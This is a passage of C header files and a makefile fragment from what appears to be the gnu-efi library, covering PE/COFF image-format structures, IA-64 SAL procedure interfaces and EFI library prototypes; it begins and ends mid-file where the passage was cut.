    UINT32   ne_csip;                     // Initial CS:IP setting
    UINT32   ne_sssp;                     // Initial SS:SP setting
    UINT16   ne_cseg;                     // Count of file segments
    UINT16   ne_cmod;                     // Entries in Module Reference Table
    UINT16   ne_cbnrestab;                // Size of non-resident name table
    UINT16   ne_segtab;                   // Offset of Segment Table
    UINT16   ne_rsrctab;                  // Offset of Resource Table
    UINT16   ne_restab;                   // Offset of resident name table
    UINT16   ne_modtab;                   // Offset of Module Reference Table
    UINT16   ne_imptab;                   // Offset of Imported Names Table
    UINT32   ne_nrestab;                  // Offset of Non-resident Names Table
    UINT16   ne_cmovent;                  // Count of movable entries
    UINT16   ne_align;                    // Segment alignment shift count
    UINT16   ne_cres;                     // Count of resource segments
    UINT8    ne_exetyp;                   // Target Operating system
    UINT8    ne_flagsothers;              // Other .EXE flags
    UINT16   ne_pretthunks;               // offset to return thunks
    UINT16   ne_psegrefbytes;             // offset to segment ref. bytes
    UINT16   ne_swaparea;                 // Minimum code swap area size
    UINT16   ne_expver;                   // Expected Windows version number
  } IMAGE_OS2_HEADER, *PIMAGE_OS2_HEADER;

//
// File header format.
//

typedef struct _IMAGE_FILE_HEADER {
    UINT16   Machine;
    UINT16   NumberOfSections;
    UINT32   TimeDateStamp;
    UINT32   PointerToSymbolTable;
    UINT32   NumberOfSymbols;
    UINT16   SizeOfOptionalHeader;
    UINT16   Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

#define IMAGE_SIZEOF_FILE_HEADER             20

#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.
#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved externel references).
#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.
#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.
#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.
#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.
#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file
#define IMAGE_FILE_SYSTEM                    0x1000  // System File.
#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.
#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reversed.

#define IMAGE_FILE_MACHINE_UNKNOWN           0
#define IMAGE_FILE_MACHINE_I386              0x14c   // Intel 386.
#define IMAGE_FILE_MACHINE_R3000             0x162   // MIPS little-endian, 0540 big-endian
#define IMAGE_FILE_MACHINE_R4000             0x166   // MIPS little-endian
#define IMAGE_FILE_MACHINE_ALPHA             0x184   // Alpha_AXP
#define IMAGE_FILE_MACHINE_ARMTHUMB_MIXED    0x1c2   // Arm/Thumb
#define IMAGE_FILE_MACHINE_POWERPC           0x1F0   // IBM PowerPC Little-Endian
#define IMAGE_FILE_MACHINE_IA64              0x200   // IA-64
#define IMAGE_FILE_MACHINE_TAHOE             0x7cc   // Intel EM machine
#define IMAGE_FILE_MACHINE_EBC               0xebc   // EFI Byte Code
#define IMAGE_FILE_MACHINE_X64               0x8664  // x86_64
//
// Directory format.
//

typedef struct _IMAGE_DATA_DIRECTORY {
    UINT32   VirtualAddress;
    UINT32   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16


typedef struct _IMAGE_ROM_OPTIONAL_HEADER {
    UINT16  Magic;
    UINT8   MajorLinkerVersion;
    UINT8   MinorLinkerVersion;
    UINT32  SizeOfCode;
    UINT32  SizeOfInitializedData;
    UINT32  SizeOfUninitializedData;
    UINT32  AddressOfEntryPoint;
    UINT32  BaseOfCode;
    UINT32  BaseOfData;
    UINT32  BaseOfBss;
    UINT32  GprMask;
    UINT32  CprMask[4];
    UINT32  GpValue;
} IMAGE_ROM_OPTIONAL_HEADER, *PIMAGE_ROM_OPTIONAL_HEADER;

typedef struct _IMAGE_OPTIONAL_HEADER {
    UINT16      Magic;
    UINT8       MajorLinkerVersion;
    UINT8       MinorLinkerVersion;
    UINT32      SizeOfCode;
    UINT32      SizeOfInitializedData;
    UINT32      SizeOfUninitializedData;
    UINT32      AddressOfEntryPoint;
    UINT32      BaseOfCode;
    // UINT32       BaseOfData;
    UINT64      ImageBase;
    UINT32      SectionAlignment;
    UINT32      FileAlignment;
    UINT16      MajorOperatingSystemVersion;
    UINT16      MinorOperatingSystemVersion;
    UINT16      MajorImageVersion;
    UINT16      MinorImageVersion;
    UINT16      MajorSubsystemVersion;
    UINT16      MinorSubsystemVersion;
    UINT32      Win32VersionValue;
    UINT32      SizeOfImage;
    UINT32      SizeOfHeaders;
    UINT32      CheckSum;
    UINT16      Subsystem;
    UINT16      DllCharacteristics;
    UINT64      SizeOfStackReserve;
    UINT64      SizeOfStackCommit;
    UINT64      SizeOfHeapReserve;
    UINT64      SizeOfHeapCommit;
    UINT32      LoaderFlags;
    UINT32      NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;


#define IMAGE_SIZEOF_ROM_OPTIONAL_HEADER      56
#define IMAGE_SIZEOF_STD_OPTIONAL_HEADER      28
#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER      224
#define IMAGE_SIZEOF_NT_OPTIONAL64_HEADER    244

#define IMAGE_NT_OPTIONAL_HDR_MAGIC        0x10b
#define IMAGE_NT_OPTIONAL_HDR64_MAGIC      0x20b
#define IMAGE_ROM_OPTIONAL_HDR_MAGIC       0x107

typedef struct _IMAGE_NT_HEADERS {
    UINT32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER OptionalHeader;
} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;

typedef struct _IMAGE_ROM_HEADERS {
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_ROM_OPTIONAL_HEADER OptionalHeader;
} IMAGE_ROM_HEADERS, *PIMAGE_ROM_HEADERS;

#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
    ((UINT32)ntheader +                                                  \
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))


// Subsystem Values

#define IMAGE_SUBSYSTEM_UNKNOWN              0   // Unknown subsystem.
#define IMAGE_SUBSYSTEM_NATIVE               1   // Image doesn't require a subsystem.
#define IMAGE_SUBSYSTEM_WINDOWS_GUI          2   // Image runs in the Windows GUI subsystem.
#define IMAGE_SUBSYSTEM_WINDOWS_CUI          3   // Image runs in the Windows character subsystem.
#define IMAGE_SUBSYSTEM_OS2_CUI              5   // image runs in the OS/2 character subsystem.
#define IMAGE_SUBSYSTEM_POSIX_CUI            7   // image run  in the Posix character subsystem.


// Directory Entries

#define IMAGE_DIRECTORY_ENTRY_EXPORT         0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT         1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE       2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION      3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY       4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC      5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG          6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7   // Description String
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8   // Machine Value (MIPS GP)
#define IMAGE_DIRECTORY_ENTRY_TLS            9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG   10   // Load Configuration Directory

//
// Section header format.
//

#define IMAGE_SIZEOF_SHORT_NAME              8

typedef struct _IMAGE_SECTION_HEADER {
    UINT8   Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
            UINT32   PhysicalAddress;
            UINT32   VirtualSize;
    } Misc;
    UINT32   VirtualAddress;
    UINT32   SizeOfRawData;
    UINT32   PointerToRawData;
    UINT32   PointerToRelocations;
    UINT32   PointerToLinenumbers;
    UINT16   NumberOfRelocations;
    UINT16   NumberOfLinenumbers;
    UINT32   Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

#define IMAGE_SIZEOF_SECTION_HEADER          40

#define IMAGE_SCN_TYPE_NO_PAD                0x00000008  // Reserved.

#define IMAGE_SCN_CNT_CODE                   0x00000020  // Section contains code.
#define IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040  // Section contains initialized data.
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080  // Section contains uninitialized data.

#define IMAGE_SCN_LNK_OTHER                  0x00000100  // Reserved.
#define IMAGE_SCN_LNK_INFO                   0x00000200  // Section contains comments or some other type of information.
#define IMAGE_SCN_LNK_REMOVE                 0x00000800  // Section contents will not become part of image.
#define IMAGE_SCN_LNK_COMDAT                 0x00001000  // Section contents comdat.

#define IMAGE_SCN_ALIGN_1BYTES               0x00100000  //
#define IMAGE_SCN_ALIGN_2BYTES               0x00200000  //
#define IMAGE_SCN_ALIGN_4BYTES               0x00300000  //
#define IMAGE_SCN_ALIGN_8BYTES               0x00400000  //
#define IMAGE_SCN_ALIGN_16BYTES              0x00500000  // Default alignment if no others are specified.
#define IMAGE_SCN_ALIGN_32BYTES              0x00600000  //
#define IMAGE_SCN_ALIGN_64BYTES              0x00700000  //

#define IMAGE_SCN_MEM_DISCARDABLE            0x02000000  // Section can be discarded.
#define IMAGE_SCN_MEM_NOT_CACHED             0x04000000  // Section is not cachable.
#define IMAGE_SCN_MEM_NOT_PAGED              0x08000000  // Section is not pageable.
#define IMAGE_SCN_MEM_SHARED                 0x10000000  // Section is shareable.
#define IMAGE_SCN_MEM_EXECUTE                0x20000000  // Section is executable.
#define IMAGE_SCN_MEM_READ                   0x40000000  // Section is readable.
#define IMAGE_SCN_MEM_WRITE                  0x80000000  // Section is writeable.

//
// Symbol format.
//


#define IMAGE_SIZEOF_SYMBOL                  18

//
// Section values.
//
// Symbols have a section number of the section in which they are
// defined. Otherwise, section numbers have the following meanings:
//

#define IMAGE_SYM_UNDEFINED           (UINT16)0           // Symbol is undefined or is common.
#define IMAGE_SYM_ABSOLUTE            (UINT16)-1          // Symbol is an absolute value.
#define IMAGE_SYM_DEBUG               (UINT16)-2          // Symbol is a special debug item.

//
// Type (fundamental) values.
//

#define IMAGE_SYM_TYPE_NULL                  0           // no type.
#define IMAGE_SYM_TYPE_VOID                  1           //
#define IMAGE_SYM_TYPE_CHAR                  2           // type character.
#define IMAGE_SYM_TYPE_SHORT                 3           // type short integer.
#define IMAGE_SYM_TYPE_INT                   4           //
#define IMAGE_SYM_TYPE_LONG                  5           //
#define IMAGE_SYM_TYPE_FLOAT                 6           //
#define IMAGE_SYM_TYPE_DOUBLE                7           //
#define IMAGE_SYM_TYPE_STRUCT                8           //
#define IMAGE_SYM_TYPE_UNION                 9           //
#define IMAGE_SYM_TYPE_ENUM                  10          // enumeration.
#define IMAGE_SYM_TYPE_MOE                   11          // member of enumeration.
#define IMAGE_SYM_TYPE_BYTE                  12          //
#define IMAGE_SYM_TYPE_WORD                  13          //
#define IMAGE_SYM_TYPE_UINT                  14          //
#define IMAGE_SYM_TYPE_DWORD                 15          //

//
// Type (derived) values.
//

#define IMAGE_SYM_DTYPE_NULL                 0           // no derived type.
#define IMAGE_SYM_DTYPE_POINTER              1           // pointer.
#define IMAGE_SYM_DTYPE_FUNCTION             2           // function.
#define IMAGE_SYM_DTYPE_ARRAY                3           // array.

//
// Storage classes.
//

#define IMAGE_SYM_CLASS_END_OF_FUNCTION      (BYTE )-1
#define IMAGE_SYM_CLASS_NULL                 0
#define IMAGE_SYM_CLASS_AUTOMATIC            1
#define IMAGE_SYM_CLASS_EXTERNAL             2
#define IMAGE_SYM_CLASS_STATIC               3
#define IMAGE_SYM_CLASS_REGISTER             4
#define IMAGE_SYM_CLASS_EXTERNAL_DEF         5
#define IMAGE_SYM_CLASS_LABEL                6
#define IMAGE_SYM_CLASS_UNDEFINED_LABEL      7
#define IMAGE_SYM_CLASS_MEMBER_OF_STRUCT     8
#define IMAGE_SYM_CLASS_ARGUMENT             9
#define IMAGE_SYM_CLASS_STRUCT_TAG           10
#define IMAGE_SYM_CLASS_MEMBER_OF_UNION      11
#define IMAGE_SYM_CLASS_UNION_TAG            12
#define IMAGE_SYM_CLASS_TYPE_DEFINITION      13
#define IMAGE_SYM_CLASS_UNDEFINED_STATIC     14
#define IMAGE_SYM_CLASS_ENUM_TAG             15
#define IMAGE_SYM_CLASS_MEMBER_OF_ENUM       16
#define IMAGE_SYM_CLASS_REGISTER_PARAM       17
#define IMAGE_SYM_CLASS_BIT_FIELD            18
#define IMAGE_SYM_CLASS_BLOCK                100
#define IMAGE_SYM_CLASS_FUNCTION             101
#define IMAGE_SYM_CLASS_END_OF_STRUCT        102
#define IMAGE_SYM_CLASS_FILE                 103
// new
#define IMAGE_SYM_CLASS_SECTION              104
#define IMAGE_SYM_CLASS_WEAK_EXTERNAL        105

// type packing constants

#define N_BTMASK                            017
#define N_TMASK                             060
#define N_TMASK1                            0300
#define N_TMASK2                            0360
#define N_BTSHFT                            4
#define N_TSHIFT                            2

// MACROS

//
// Communal selection types.
//

#define IMAGE_COMDAT_SELECT_NODUPLICATES   1
#define IMAGE_COMDAT_SELECT_ANY            2
#define IMAGE_COMDAT_SELECT_SAME_SIZE      3
#define IMAGE_COMDAT_SELECT_EXACT_MATCH    4
#define IMAGE_COMDAT_SELECT_ASSOCIATIVE    5

#define IMAGE_WEAK_EXTERN_SEARCH_NOLIBRARY 1
#define IMAGE_WEAK_EXTERN_SEARCH_LIBRARY   2
#define IMAGE_WEAK_EXTERN_SEARCH_ALIAS     3


//
// Relocation format.
//

typedef struct _IMAGE_RELOCATION {
    UINT32   VirtualAddress;
    UINT32   SymbolTableIndex;
    UINT16   Type;
} IMAGE_RELOCATION;

#define IMAGE_SIZEOF_RELOCATION              10

//
// I386 relocation types.
//

#define IMAGE_REL_I386_ABSOLUTE              0           // Reference is absolute, no relocation is necessary
#define IMAGE_REL_I386_DIR16                 01          // Direct 16-bit reference to the symbols virtual address
#define IMAGE_REL_I386_REL16                 02          // PC-relative 16-bit reference to the symbols virtual address
#define IMAGE_REL_I386_DIR32                 06          // Direct 32-bit reference to the symbols virtual address
#define IMAGE_REL_I386_DIR32NB               07          // Direct 32-bit reference to the symbols virtual address, base not included
#define IMAGE_REL_I386_SEG12                 011         // Direct 16-bit reference to the segment-selector bits of a 32-bit virtual address
#define IMAGE_REL_I386_SECTION               012
#define IMAGE_REL_I386_SECREL                013
#define IMAGE_REL_I386_REL32                 024         // PC-relative 32-bit reference to the symbols virtual address

//
// MIPS relocation types.
//

#define IMAGE_REL_MIPS_ABSOLUTE              0           // Reference is absolute, no relocation is necessary
#define IMAGE_REL_MIPS_REFHALF               01
#define IMAGE_REL_MIPS_REFWORD               02
#define IMAGE_REL_MIPS_JMPADDR               03
#define IMAGE_REL_MIPS_REFHI                 04
#define IMAGE_REL_MIPS_REFLO                 05
#define IMAGE_REL_MIPS_GPREL                 06
#define IMAGE_REL_MIPS_LITERAL               07
#define IMAGE_REL_MIPS_SECTION               012
#define IMAGE_REL_MIPS_SECREL                013
#define IMAGE_REL_MIPS_REFWORDNB             042
#define IMAGE_REL_MIPS_PAIR                  045

//
// Alpha Relocation types.
//

#define IMAGE_REL_ALPHA_ABSOLUTE             0x0
#define IMAGE_REL_ALPHA_REFLONG              0x1
#define IMAGE_REL_ALPHA_REFQUAD              0x2
#define IMAGE_REL_ALPHA_GPREL32              0x3
#define IMAGE_REL_ALPHA_LITERAL              0x4
#define IMAGE_REL_ALPHA_LITUSE               0x5
#define IMAGE_REL_ALPHA_GPDISP               0x6
#define IMAGE_REL_ALPHA_BRADDR               0x7
#define IMAGE_REL_ALPHA_HINT                 0x8
#define IMAGE_REL_ALPHA_INLINE_REFLONG       0x9
#define IMAGE_REL_ALPHA_REFHI                0xA
#define IMAGE_REL_ALPHA_REFLO                0xB
#define IMAGE_REL_ALPHA_PAIR                 0xC
#define IMAGE_REL_ALPHA_MATCH                0xD
#define IMAGE_REL_ALPHA_SECTION              0xE
#define IMAGE_REL_ALPHA_SECREL               0xF
#define IMAGE_REL_ALPHA_REFLONGNB            0x10

//
// IBM PowerPC relocation types.
//

#define IMAGE_REL_PPC_ABSOLUTE 0x0000  // NOP
#define IMAGE_REL_PPC_ADDR64   0x0001  // 64-bit address
#define IMAGE_REL_PPC_ADDR32   0x0002  // 32-bit address
#define IMAGE_REL_PPC_ADDR24   0x0003  // 26-bit address, shifted left 2 (branch absolute)
#define IMAGE_REL_PPC_ADDR16   0x0004  // 16-bit address
#define IMAGE_REL_PPC_ADDR14   0x0005  // 16-bit address, shifted left 2 (load doubleword)
#define IMAGE_REL_PPC_REL24    0x0006  // 26-bit PC-relative offset, shifted left 2 (branch relative)
#define IMAGE_REL_PPC_REL14    0x0007  // 16-bit PC-relative offset, shifted left 2 (br cond relative)
#define IMAGE_REL_PPC_TOCREL16 0x0008  // 16-bit offset from TOC base
#define IMAGE_REL_PPC_TOCREL14 0x0009  // 16-bit offset from TOC base, shifted left 2 (load doubleword)

#define IMAGE_REL_PPC_ADDR32NB 0x000A  // 32-bit addr w/o image base
#define IMAGE_REL_PPC_SECREL   0x000B  // va of containing section (as in an image sectionhdr)
#define IMAGE_REL_PPC_SECTION  0x000C  // sectionheader number
#define IMAGE_REL_PPC_IFGLUE   0x000D  // substitute TOC restore instruction iff symbol is glue code
#define IMAGE_REL_PPC_IMGLUE   0x000E  // symbol is glue code; virtual address is TOC restore instruction

#define IMAGE_REL_PPC_TYPEMASK 0x00FF  // mask to isolate above values in IMAGE_RELOCATION.Type

// Flag bits in IMAGE_RELOCATION.TYPE

#define IMAGE_REL_PPC_NEG      0x0100  // subtract reloc value rather than adding it
#define IMAGE_REL_PPC_BRTAKEN  0x0200  // fix branch prediction bit to predict branch taken
#define IMAGE_REL_PPC_BRNTAKEN 0x0400  // fix branch prediction bit to predict branch not taken
#define IMAGE_REL_PPC_TOCDEFN  0x0800  // toc slot defined in file (or, data in toc)

//
// Based relocation format.
//

typedef struct _IMAGE_BASE_RELOCATION {
    UINT32   VirtualAddress;
    UINT32   SizeOfBlock;
//  UINT16    TypeOffset[1];
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;

#define IMAGE_SIZEOF_BASE_RELOCATION         8

//
// Based relocation types.
//

#define IMAGE_REL_BASED_ABSOLUTE              0
#define IMAGE_REL_BASED_HIGH                  1
#define IMAGE_REL_BASED_LOW                   2
#define IMAGE_REL_BASED_HIGHLOW               3
#define IMAGE_REL_BASED_HIGHADJ               4
#define IMAGE_REL_BASED_MIPS_JMPADDR          5
#define IMAGE_REL_BASED_IA64_IMM64            9
#define IMAGE_REL_BASED_DIR64                 10

//
// Line number format.
//

typedef struct _IMAGE_LINENUMBER {
    union {
        UINT32   SymbolTableIndex;               // Symbol table index of function name if Linenumber is 0.
        UINT32   VirtualAddress;                 // Virtual address of line number.
    } Type;
    UINT16    Linenumber;                         // Line number.
} IMAGE_LINENUMBER;

#define IMAGE_SIZEOF_LINENUMBER              6

//
// Archive format.
//

#define IMAGE_ARCHIVE_START_SIZE             8
#define IMAGE_ARCHIVE_START                  "!<arch>\n"
#define IMAGE_ARCHIVE_END                    "`\n"
#define IMAGE_ARCHIVE_PAD                    "\n"
#define IMAGE_ARCHIVE_LINKER_MEMBER          "/               "
#define IMAGE_ARCHIVE_LONGNAMES_MEMBER       "//              "

typedef struct _IMAGE_ARCHIVE_MEMBER_HEADER {
    UINT8     Name[16];                          // File member name - `/' terminated.
    UINT8     Date[12];                          // File member date - decimal.
    UINT8     UserID[6];                         // File member user id - decimal.
    UINT8     GroupID[6];                        // File member group id - decimal.
    UINT8     Mode[8];                           // File member mode - octal.
    UINT8     Size[10];                          // File member size - decimal.
    UINT8     EndHeader[2];                      // String to end header.
} IMAGE_ARCHIVE_MEMBER_HEADER, *PIMAGE_ARCHIVE_MEMBER_HEADER;

#define IMAGE_SIZEOF_ARCHIVE_MEMBER_HDR      60

//
// DLL support.
//

//
// Export Format
//

typedef struct _IMAGE_EXPORT_DIRECTORY {
    UINT32   Characteristics;
    UINT32   TimeDateStamp;
    UINT16   MajorVersion;
    UINT16   MinorVersion;
    UINT32   Name;
    UINT32   Base;
    UINT32   NumberOfFunctions;
    UINT32   NumberOfNames;
    UINT32   AddressOfFunctions;
    UINT32   AddressOfNames;
    UINT32   AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

//
// Import Format
//

typedef struct _IMAGE_IMPORT_BY_NAME {
    UINT16    Hint;
    UINT8     Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;

typedef struct _IMAGE_THUNK_DATA {
    union {
        UINT32 Function;
        UINT32 Ordinal;
        PIMAGE_IMPORT_BY_NAME AddressOfData;
    } u1;
} IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA;

#define IMAGE_ORDINAL_FLAG 0x80000000
#define IMAGE_SNAP_BY_ORDINAL(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG) != 0)
#define IMAGE_ORDINAL(Ordinal) (Ordinal & 0xffff)

typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    UINT32   Characteristics;
    UINT32   TimeDateStamp;
    UINT32   ForwarderChain;
    UINT32   Name;
    PIMAGE_THUNK_DATA FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;

#endif

```

`include/gnu-efi/ia64/salproc.h`:

```h
#ifndef _SAL_PROC_H
#define _SAL_PROC_H
//
//
//Copyright (c) 1999  Intel Corporation
//
//Module Name:
//
//    SalProc.h
//
//Abstract:
//
//    Main SAL interface routins for IA-64 calls. 
//
//
//Revision History
//
//

//  return value that mimicks r8,r9,r10 & r11 registers 
typedef struct {
    UINT64     p0;
    UINT64     p1;
    UINT64     p2;
    UINT64     p3;
} rArg;

#define  SAL_PCI_CONFIG_READ                    0x01000010
#define  SAL_PCI_CONFIG_WRITE                   0x01000011

typedef VOID (*PFN)();
typedef rArg (*PFN_SAL_PROC)(UINT64,UINT64,UINT64,UINT64,UINT64,UINT64,UINT64,UINT64);
typedef rArg (*PFN_SAL_CALLBACK)(UINT64,UINT64,UINT64,UINT64,UINT64,UINT64,UINT64,UINT64);

typedef struct _PLABEL {
   UINT64 ProcEntryPoint;
   UINT64 GP;
} PLABEL;

typedef struct tagIA32_BIOS_REGISTER_STATE {

    // general registers
    UINT32 eax;
    UINT32 ecx;
    UINT32 edx;
    UINT32 ebx;

    // stack registers
    UINT32 esp;
    UINT32 ebp;
    UINT32 esi;
    UINT32 edi;

    // eflags
    UINT32 eflags;

    // instruction pointer
    UINT32 eip;

    UINT16 cs;
    UINT16 ds;
    UINT16 es;
    UINT16 fs;
    UINT16 gs;
    UINT16 ss;

    // Reserved
    UINT32 Reserved1;
    UINT64 Reserved2;
} IA32_BIOS_REGISTER_STATE;

VOID EFIInitMsg(VOID);

EFI_STATUS
PlRegisterAndStartTimer(
    IN UINTN Period
    );

EFI_STATUS
PlDeRegisterAndCancelTimer(VOID);

VOID
SalProc (
    IN  UINT64    Arg1,
    IN  UINT64    Arg2,
    IN  UINT64    Arg3,
    IN  UINT64    Arg4,
    IN  UINT64    Arg5,
    IN  UINT64    Arg6,
    IN  UINT64    Arg7,
    IN  UINT64    Arg8,
    OUT rArg      *Results  OPTIONAL
    );

VOID
SalCallBack (
    IN  UINT64    Arg1,
    IN  UINT64    Arg2,
    IN  UINT64    Arg3,
    IN  UINT64    Arg4,
    IN  UINT64    Arg5,
    IN  UINT64    Arg6,
    IN  UINT64    Arg7,
    IN  UINT64    Arg8,
    OUT rArg      *Results  OPTIONAL
    );

VOID
RUNTIMEFUNCTION
RtSalCallBack (
    IN  UINT64    Arg1,
    IN  UINT64    Arg2,
    IN  UINT64    Arg3,
    IN  UINT64    Arg4,
    IN  UINT64    Arg5,
    IN  UINT64    Arg6,
    IN  UINT64    Arg7,
    IN  UINT64    Arg8,
    OUT rArg      *Results  OPTIONAL
    );


extern PLABEL   RtGlobalSalProcEntry;
extern PLABEL   RtGlobalSALCallBack;

#pragma pack(1)
//
// SAL System Table
//
typedef struct {
    UINT32 Signature;
    UINT32 Length;
    UINT16 Revision;
    UINT16 EntryCount;
    UINT8  CheckSum;
    UINT8  Reserved[7];
    UINT16 SALA_Ver;
    UINT16 SALB_Ver;
    UINT8  OemId[32];
    UINT8  ProductID[32];
    UINT8  Reserved2[8];
} SAL_SYSTEM_TABLE_HDR;

#define SAL_ST_ENTRY_POINT          0
#define SAL_ST_MEMORY_DESCRIPTOR    1
#define SAL_ST_PLATFORM_FEATURES    2
#define SAL_ST_TR_USAGE             3
#define SAL_ST_PTC                  4
#define SAL_ST_AP_WAKEUP            5

typedef struct {
    UINT8   Type;   //  Type == 0 
    UINT8   Reserved[7];
    UINT64  PalProcEntry;
    UINT64  SalProcEntry;
    UINT64  GlobalDataPointer;
    UINT64  Reserved2[2];
} SAL_ST_ENTRY_POINT_DESCRIPTOR;

typedef struct {
    UINT8   Type;   //  Type == 1
    UINT8   NeedVirtualRegistration;
    UINT8   MemoryAttributes;
    UINT8   PageAccessRights;
    UINT8   SupportedAttributes;
    UINT8   Reserved;
    UINT16  MemoryType;
    UINT64  PhysicalMemoryAddress;
    UINT32  Length;
    UINT32  Reserved1;
    UINT64  OemReserved;
} SAL_ST_MEMORY_DESCRIPTOR_ENTRY;

//
// MemoryType info
//
#define SAL_SAPIC_IPI_BLOCK 0x0002
#define SAL_IO_PORT_MAPPING 0x0003

typedef struct {
    UINT8   Type;   // Type == 2
    UINT8   PlatformFeatures;
    UINT8   Reserved[14];
} SAL_ST_MEMORY_DECRIPTOR;

typedef struct {
    UINT8   Type;   // Type == 3
    UINT8   TRType;
    UINT8   TRNumber;
    UINT8   Reserved[5];
    UINT64  VirtualAddress;
    UINT64  EncodedPageSize;
    UINT64  Reserved1;
} SAL_ST_TR_DECRIPTOR;

typedef struct {
    UINT64  NumberOfProcessors;
    UINT64  LocalIDRegister;
} SAL_COHERENCE_DOMAIN_INFO;

typedef struct {
    UINT8                       Type;   // Type == 4
    UINT8                       Reserved[3];
    UINT32                      NumberOfDomains;
    SAL_COHERENCE_DOMAIN_INFO  *DomainInformation;
} SAL_ST_CACHE_COHERENCE_DECRIPTOR;

typedef struct {
    UINT8   Type;   // Type == 5
    UINT8   WakeUpType;
    UINT8   Reserved[6];
    UINT64  ExternalInterruptVector;
} SAL_ST_AP_WAKEUP_DECRIPTOR;

typedef struct {
    SAL_SYSTEM_TABLE_HDR            Header;
    SAL_ST_ENTRY_POINT_DESCRIPTOR   Entry0;
} SAL_SYSTEM_TABLE_ASCENDING_ORDER;

#define     FIT_ENTRY_PTR       (0x100000000 - 32)  // 4GB - 24
#define     FIT_PALA_ENTRY      (0x100000000 - 48)  // 4GB - 32
#define     FIT_PALB_TYPE       01

typedef struct {
    UINT64  Address;
    UINT8   Size[3];
    UINT8   Reserved;
    UINT16  Revision;
    UINT8   Type:7;
    UINT8   CheckSumValid:1;
    UINT8   CheckSum;
} FIT_ENTRY;

#pragma pack()

typedef
 rArg 
(*CALL_SAL_PROC)(
    IN  UINT64    Arg1,
    IN  UINT64    Arg2,
    IN  UINT64    Arg3,
    IN  UINT64    Arg4,
    IN  UINT64    Arg5,
    IN  UINT64    Arg6,
    IN  UINT64    Arg7,
    IN  UINT64    Arg8
    );

typedef
 rArg 
(*CALL_PAL_PROC)(
    IN  UINT64    Arg1,
    IN  UINT64    Arg2,
    IN  UINT64    Arg3,
    IN  UINT64    Arg4
    );

extern CALL_SAL_PROC   GlobalSalProc;
extern CALL_PAL_PROC   GlobalPalProc;
extern PLABEL   SalProcPlabel;
extern PLABEL   PalProcPlabel;

#endif


```

`include/gnu-efi/inc.mak`:

```mak


INC_DEPS = $(INC_DEPS)          \
                efi.h           \
                efiapi.h        \
                efibind.h       \
                eficon.h        \
                efidebug.h      \
                efidef.h        \
                efidevp.h       \
                efierr.h        \
                efifs.h         \
                efilib.h        \
                efipart.h       \
                efipciio.h      \
                efiprot.h       \
                efipxe.h        \
                efivar.h        \
                pe.h            \
                efiip.h         \
                efiudp.h        \
                efitcp.h        \
                stdarg.h

```

`include/gnu-efi/lib.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    lib.h

Abstract:

    EFI library header files



Revision History

--*/

#ifdef __GNUC__
#pragma GCC visibility push(hidden)
#endif

#include "efi.h"
#include "efilib.h"
#include "efirtlib.h"

//
// Include non architectural protocols
//
#include "protocol/efivar.h"
#include "protocol/legacyboot.h"
#include "protocol/intload.h"
#include "protocol/vgaclass.h"
#include "protocol/eficonsplit.h"
#include "protocol/adapterdebug.h"
#include "protocol/intload.h"

#include "efigpt.h"
#include "libsmbios.h"

//
// Prototypes
//

VOID
InitializeGuid (
    VOID
    );

INTN EFIAPI
LibStubStriCmp (
    IN EFI_UNICODE_COLLATION_INTERFACE  *This,
    IN CHAR16                           *S1,
    IN CHAR16                           *S2
    );

BOOLEAN EFIAPI
LibStubMetaiMatch (
    IN EFI_UNICODE_COLLATION_INTERFACE  *This,
    IN CHAR16                           *String,
    IN CHAR16                           *Pattern
    );

VOID EFIAPI
LibStubStrLwrUpr (
